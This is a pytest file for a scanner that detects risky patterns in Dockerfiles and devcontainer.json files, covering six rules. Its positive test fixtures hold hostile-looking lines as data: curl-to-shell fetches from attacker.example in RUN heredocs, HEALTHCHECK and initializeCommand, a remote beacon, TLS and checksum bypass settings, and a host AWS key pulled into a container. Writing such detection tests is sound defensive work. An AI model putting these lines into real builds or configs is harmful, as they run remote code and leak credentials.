"""Tests for scripts/lib/container_patterns.py.

Each of the 6 catalogued rules gets:
  * a data-model sanity test (RULES tuple, Rule/Finding shape),
  * at least one positive scenario (rule MUST fire),
  * at least one negative scenario (rule MUST NOT fire on benign input).

Pure stdlib; no third-party deps; no network calls.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import container_patterns as cp  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen_ordered() -> None:
    """RULES must be a tuple and contain every advertised rule id."""
    assert isinstance(cp.RULES, tuple)
    rule_ids = [r.id for r in cp.RULES]
    expected = {
        "container-dockerignore-evasion",
        "dockerfile-heredoc-pipe-to-shell",
        "dockerfile-copy-from-external-registry",
        "dockerfile-healthcheck-shell-escape",
        "devcontainer-untrusted-features-and-hooks",
        "dockerfile-env-registry-bypass",
    }
    assert expected == set(rule_ids), f"missing: {expected - set(rule_ids)}"


def test_every_rule_has_owasp_mapping() -> None:
    for rule in cp.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "MAJOR", "MINOR", "NIT"}, rule.id


def test_finding_named_tuple_shape() -> None:
    f = cp.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="CRITICAL", description="d", owasp_asi="ASI-05",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "CRITICAL"
    assert f.description == "d"
    assert f.owasp_asi == "ASI-05"


# ---------- Rule 1: container-dockerignore-evasion -----------------------


def test_dockerignore_evasion_positive_no_file() -> None:
    """Wildcard COPY + no .dockerignore → MAJOR finding."""
    dockerfile = (
        "FROM python:3.12-slim\n"
        "WORKDIR /app\n"
        "COPY . /app\n"
        "RUN pip install -r requirements.txt\n"
    )
    fs = cp.scan_dockerfile_with_dockerignore(dockerfile, None)
    assert len(fs) == 1
    assert fs[0].rule_id == "container-dockerignore-evasion"
    assert fs[0].severity == "MAJOR"


def test_dockerignore_evasion_positive_permissive() -> None:
    """Wildcard COPY + .dockerignore missing `.env` exclusion → fires."""
    dockerfile = "FROM python:3.12-slim\nCOPY . .\n"
    dockerignore = "*.pyc\n__pycache__\n"
    fs = cp.scan_dockerfile_with_dockerignore(dockerfile, dockerignore)
    assert len(fs) == 1
    assert fs[0].rule_id == "container-dockerignore-evasion"
    assert ".env" in fs[0].description or ".ssh" in fs[0].description


def test_dockerignore_evasion_negative_no_wildcard_copy() -> None:
    """Explicit COPY of specific files → rule does not fire even without
    a .dockerignore."""
    dockerfile = (
        "FROM python:3.12-slim\n"
        "COPY requirements.txt /app/requirements.txt\n"
        "COPY src/ /app/src/\n"
    )
    fs = cp.scan_dockerfile_with_dockerignore(dockerfile, None)
    assert fs == []


def test_dockerignore_evasion_negative_complete_ignore() -> None:
    """Wildcard COPY but .dockerignore excludes every sensitive path."""
    dockerfile = "FROM node:20-alpine\nCOPY . /srv\n"
    dockerignore = "\n".join([
        ".env", ".env.local", ".env.production", ".env.development",
        ".git", ".gitignore",
        ".aws", ".ssh", ".gnupg", ".npmrc", ".pypirc", ".netrc",
        "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
        "*.pem", "*.key", "*.p12", "*.pfx", "*.kdbx",
        "credentials.json", "credentials.yaml", "credentials.yml",
        "secrets.yaml", "secrets.yml", "secret.yaml", "secret.yml",
        ".claude", ".cursor", ".codeium", ".windsurf",
        ".vscode/settings.json",
        "kubeconfig", ".kube",
    ])
    fs = cp.scan_dockerfile_with_dockerignore(dockerfile, dockerignore)
    assert fs == [], f"unexpected findings: {fs}"


# ---------- Rule 2: dockerfile-heredoc-pipe-to-shell ---------------------


def test_heredoc_pipe_to_shell_positive_pipe() -> None:
    """RUN heredoc body with explicit `curl | bash` → CRITICAL."""
    dockerfile = (
        "FROM debian:bookworm-slim\n"
        "RUN <<EOF bash\n"
        "  curl -fsSL https://attacker.example/install.sh | sh\n"
        "EOF\n"
    )
    fs = cp.scan_text(dockerfile)
    ids = [f.rule_id for f in fs]
    assert "dockerfile-heredoc-pipe-to-shell" in ids
    matching = [
        f for f in fs
        if f.rule_id == "dockerfile-heredoc-pipe-to-shell"
    ]
    assert matching[0].severity == "CRITICAL"


def test_heredoc_pipe_to_shell_positive_crossline() -> None:
    """Cross-line download-then-exec inside heredoc → CRITICAL."""
    dockerfile = (
        "FROM debian:bookworm-slim\n"
        "RUN <<EOF\n"
        "  wget https://attacker.example/install.sh\n"
        "  bash install.sh\n"
        "EOF\n"
    )
    fs = cp.scan_text(dockerfile)
    matching = [
        f for f in fs
        if f.rule_id == "dockerfile-heredoc-pipe-to-shell"
    ]
    assert matching, f"expected heredoc rule to fire; got {fs}"
    assert matching[0].severity == "CRITICAL"


def test_heredoc_pipe_to_shell_negative_make_only() -> None:
    """Legitimate heredoc that fetches a tarball and runs `make` — `make`
    is NOT in the exec set, so the rule must not fire."""
    dockerfile = (
        "FROM debian:bookworm-slim\n"
        "RUN <<EOF\n"
        "  wget https://example.org/foo-1.0.tar.gz\n"
        "  tar -xzf foo-1.0.tar.gz\n"
        "  cd foo-1.0 && ./configure && make && make install\n"
        "EOF\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-heredoc-pipe-to-shell"
    ]
    assert fs == [], f"unexpected heredoc findings: {fs}"


def test_heredoc_pipe_to_shell_negative_singleline_run() -> None:
    """Single-line `RUN curl | sh` is handled by other detectors — the
    HEREDOC rule must NOT fire because there's no heredoc opener."""
    dockerfile = (
        "FROM debian:bookworm-slim\n"
        "RUN curl -fsSL https://example.org/setup.sh | sh\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-heredoc-pipe-to-shell"
    ]
    assert fs == []


# ---------- Rule 3: dockerfile-copy-from-external-registry ---------------


def test_copy_from_external_positive_unpinned_latest() -> None:
    """COPY --from=evil-org/img:latest → CRITICAL (unpinned + latest)."""
    dockerfile = (
        "FROM python:3.12-slim@sha256:" + "a" * 64 + "\n"
        "COPY --from=evil-org/sneaky-builder:latest "
        "/usr/local/bin/sneaky /usr/local/bin/sneaky\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-copy-from-external-registry"
    ]
    assert fs, f"expected COPY --from rule to fire; got {fs}"
    assert any(f.severity == "CRITICAL" for f in fs)


def test_copy_from_external_positive_untrusted_registry() -> None:
    """A pinned image from a non-trusted registry still flags MAJOR."""
    dockerfile = (
        "FROM debian:bookworm-slim\n"
        "COPY --from=evil.example.com/lib:" + ("@sha256:" + "a" * 64)
        + " /lib/ /lib/\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-copy-from-external-registry"
    ]
    assert fs, f"expected COPY --from rule to fire; got {fs}"
    assert any("untrusted registry" in f.description for f in fs)


def test_copy_from_external_negative_multistage_named_stage() -> None:
    """COPY --from=builder (a named stage) must NOT flag."""
    dockerfile = (
        "FROM python:3.12-slim AS builder\n"
        "RUN pip install build && python -m build\n"
        "FROM python:3.12-slim\n"
        "COPY --from=builder /src/dist/*.whl /tmp/\n"
        "RUN pip install /tmp/*.whl\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-copy-from-external-registry"
    ]
    assert fs == [], f"unexpected findings on multi-stage build: {fs}"


def test_copy_from_external_negative_numeric_stage() -> None:
    """COPY --from=0 (numeric index, multi-stage) must NOT flag."""
    dockerfile = (
        "FROM debian:bookworm-slim\n"
        "RUN echo hi\n"
        "FROM scratch\n"
        "COPY --from=0 /tmp/ /tmp/\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-copy-from-external-registry"
    ]
    assert fs == []


# ---------- Rule 4: dockerfile-healthcheck-shell-escape ------------------


def test_healthcheck_positive_pipe_to_shell() -> None:
    """HEALTHCHECK CMD piping to bash → CRITICAL."""
    dockerfile = (
        "FROM nginx:1.27\n"
        "HEALTHCHECK --interval=30s CMD "
        "curl -fsSL https://attacker.example/cmd | bash\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-healthcheck-shell-escape"
    ]
    assert fs, f"expected HEALTHCHECK rule to fire; got {fs}"
    assert fs[0].severity == "CRITICAL"


def test_healthcheck_positive_nonlocal_beacon() -> None:
    """HEALTHCHECK contacting non-local host + `|| exit 0` → CRITICAL
    composite c2-beacon finding (one finding with the always-succeed +
    non-local signals folded together, not two findings)."""
    dockerfile = (
        "FROM alpine:3.20\n"
        "HEALTHCHECK --interval=30s --start-period=10s "
        "CMD curl -fsSL https://attacker.example/beacon "
        "|| exit 0\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-healthcheck-shell-escape"
    ]
    assert len(fs) == 1, f"expected one composite finding; got {fs}"
    assert fs[0].severity == "CRITICAL", fs[0]
    assert "always succeeds" in fs[0].description
    assert "non-local" in fs[0].description


def test_healthcheck_negative_localhost_curl() -> None:
    """Legitimate liveness probe against localhost MUST not flag."""
    dockerfile = (
        "FROM nginx:1.27\n"
        "HEALTHCHECK --interval=30s CMD "
        "curl -fsS http://localhost:8080/health || exit 1\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-healthcheck-shell-escape"
    ]
    assert fs == [], f"unexpected localhost healthcheck flag: {fs}"


def test_healthcheck_negative_127_address() -> None:
    """127.0.0.1 is also local — must not flag."""
    dockerfile = (
        "FROM nginx:1.27\n"
        "HEALTHCHECK CMD wget -qO- http://127.0.0.1:8080/healthz "
        "|| exit 1\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-healthcheck-shell-escape"
    ]
    assert fs == []


# ---------- Rule 5: devcontainer-untrusted-features-and-hooks ------------


def test_devcontainer_positive_initialize_command() -> None:
    """initializeCommand runs on HOST → CRITICAL."""
    devcontainer = (
        '{\n'
        '  "name": "Pwn",\n'
        '  "image": "ghcr.io/devcontainers/base:ubuntu",\n'
        '  "initializeCommand": "curl -fsSL https://attacker.example/x.sh | sh"\n'
        '}\n'
    )
    fs = cp.scan_devcontainer(devcontainer)
    assert any(
        "initializeCommand" in f.matched_text
        or "HOST" in f.description
        for f in fs
    ), f"expected initializeCommand finding; got {fs}"
    assert any(f.severity == "CRITICAL" for f in fs)


def test_devcontainer_positive_untrusted_feature() -> None:
    """Feature from non-ghcr.io/devcontainers* namespace → MAJOR."""
    devcontainer = (
        '{\n'
        '  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",\n'
        '  "features": {\n'
        '    "ghcr.io/evil-org/totally-fine/feature:1.0": {}\n'
        '  }\n'
        '}\n'
    )
    fs = cp.scan_devcontainer(devcontainer)
    assert any(
        "untrusted" in f.description.lower() for f in fs
    ), f"expected untrusted-feature finding; got {fs}"


def test_devcontainer_positive_local_env_exfil() -> None:
    """containerEnv that pulls `${localEnv:FOO}` exfiltrates host env."""
    devcontainer = (
        '{\n'
        '  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",\n'
        '  "containerEnv": {\n'
        '    "AWS_ACCESS_KEY": "${localEnv:AWS_ACCESS_KEY_ID}"\n'
        '  }\n'
        '}\n'
    )
    fs = cp.scan_devcontainer(devcontainer)
    assert any(
        "localEnv" in f.description or "host environment" in f.description
        for f in fs
    ), f"expected localEnv exfil finding; got {fs}"


def test_devcontainer_negative_clean_config() -> None:
    """A well-formed devcontainer.json with trusted features and only
    `postCreateCommand: npm install` MUST NOT fire any rule."""
    devcontainer = (
        '{\n'
        '  "name": "Clean dev container",\n'
        '  "image": "mcr.microsoft.com/devcontainers/javascript-node:20",\n'
        '  "features": {\n'
        '    "ghcr.io/devcontainers/features/git:1": {}\n'
        '  },\n'
        '  "postCreateCommand": "npm install"\n'
        '}\n'
    )
    fs = cp.scan_devcontainer(devcontainer)
    # postCreateCommand with `npm install` is benign — no pipe to shell.
    # The features ref is `ghcr.io/devcontainers/features/git:1` which
    # IS in the trusted prefix list and has a `:1` tag (treated as
    # pinned-ish; unpinned check requires `:latest` or no tag at all).
    assert fs == [], f"unexpected findings on clean devcontainer: {fs}"


def test_devcontainer_negative_jsonc_comments() -> None:
    """A JSONC devcontainer.json with `//` comments must parse cleanly
    (no MAJOR "invalid JSON" finding)."""
    devcontainer = (
        '{\n'
        '  // I am a JSONC comment\n'
        '  "image": "mcr.microsoft.com/devcontainers/base:ubuntu"\n'
        '}\n'
    )
    fs = cp.scan_devcontainer(devcontainer)
    # Image is not unpinned by our heuristic (no :latest, and has a tag),
    # no hooks, no features — should be clean.
    assert all(
        "unparseable" not in f.description for f in fs
    ), f"comment-stripping failed: {fs}"


# ---------- Rule 6: dockerfile-env-registry-bypass -----------------------


def test_env_bypass_positive_goproxy_direct() -> None:
    """ENV GOPROXY=direct → CRITICAL."""
    dockerfile = (
        "FROM golang:1.22\n"
        "ENV GOPROXY=direct\n"
        "ENV GOSUMDB=off\n"
        "RUN go build ./...\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-env-registry-bypass"
    ]
    assert len(fs) >= 2, f"expected 2 ENV bypass findings; got {fs}"
    assert any(f.severity == "CRITICAL" for f in fs)


def test_env_bypass_positive_tls_off() -> None:
    """ENV NODE_TLS_REJECT_UNAUTHORIZED=0 → CRITICAL."""
    dockerfile = (
        "FROM node:20-alpine\n"
        "ENV NODE_TLS_REJECT_UNAUTHORIZED=0\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-env-registry-bypass"
    ]
    assert fs, f"expected NODE_TLS bypass finding; got {fs}"
    assert fs[0].severity == "CRITICAL"


def test_env_bypass_positive_pip_index_http() -> None:
    """ENV PIP_INDEX_URL=http://… → CRITICAL (plain HTTP)."""
    dockerfile = (
        "FROM python:3.12-slim\n"
        "ENV PIP_INDEX_URL=http://attacker.example/simple/\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-env-registry-bypass"
    ]
    assert fs, f"expected PIP_INDEX_URL bypass finding; got {fs}"
    assert any(f.severity == "CRITICAL" for f in fs)


def test_env_bypass_negative_normal_env() -> None:
    """ENV PATH=… / ENV PYTHONUNBUFFERED=1 / ENV LANG=C.UTF-8 must NOT
    flag (these are universal innocent Dockerfile patterns)."""
    dockerfile = (
        "FROM python:3.12-slim\n"
        "ENV PATH=/usr/local/bin:/usr/bin:/bin\n"
        "ENV PYTHONUNBUFFERED=1\n"
        "ENV LANG=C.UTF-8\n"
        "ENV TZ=UTC\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-env-registry-bypass"
    ]
    assert fs == [], f"unexpected ENV findings: {fs}"


def test_env_bypass_negative_canonical_pip_index() -> None:
    """ENV PIP_INDEX_URL=https://pypi.org/simple is canonical, must not
    flag."""
    dockerfile = (
        "FROM python:3.12-slim\n"
        "ENV PIP_INDEX_URL=https://pypi.org/simple\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-env-registry-bypass"
    ]
    assert fs == [], f"unexpected canonical-index finding: {fs}"


def test_env_bypass_legacy_form_supported() -> None:
    """Legacy `ENV KEY value` (no equals) form must still parse."""
    dockerfile = (
        "FROM golang:1.22\n"
        "ENV GOPROXY direct\n"
    )
    fs = [
        f for f in cp.scan_text(dockerfile)
        if f.rule_id == "dockerfile-env-registry-bypass"
    ]
    assert fs, f"legacy ENV form not parsed: {fs}"


# ---------- scan_text composed behaviour --------------------------------


def test_scan_text_empty_input() -> None:
    assert cp.scan_text("") == []


def test_scan_text_orders_by_line_column() -> None:
    """Findings should be sorted by (line, column, rule_id)."""
    dockerfile = (
        "FROM python:3.12-slim\n"          # 1
        "ENV NODE_TLS_REJECT_UNAUTHORIZED=0\n"  # 2  → ENV bypass
        "HEALTHCHECK CMD curl https://x.example/y | sh\n"  # 3 → HC critical
        "COPY --from=evil-org/x:latest /a /a\n"  # 4 → COPY --from
    )
    fs = cp.scan_text(dockerfile)
    lines = [f.line for f in fs]
    assert lines == sorted(lines), f"findings not ordered by line: {fs}"


def test_scan_text_file_kind_devcontainer() -> None:
    """file_kind='devcontainer' should route to scan_devcontainer."""
    text = (
        '{\n'
        '  "initializeCommand": "echo host-side"\n'
        '}\n'
    )
    fs = cp.scan_text(text, file_kind="devcontainer")
    assert any(
        f.rule_id == "devcontainer-untrusted-features-and-hooks"
        for f in fs
    )


def test_scan_text_file_kind_any_runs_all() -> None:
    """file_kind='any' should run both Dockerfile + devcontainer rules.

    We feed a mixed string that looks like a Dockerfile but has a JSON
    initializeCommand line — only the Dockerfile rules should ever fire
    (the JSON parser will reject this text), so we settle for verifying
    that the regex-only rules still fire."""
    text = (
        "FROM alpine:3.20\n"
        "ENV NODE_TLS_REJECT_UNAUTHORIZED=0\n"
    )
    fs = cp.scan_text(text, file_kind="any")
    assert any(
        f.rule_id == "dockerfile-env-registry-bypass" for f in fs
    )
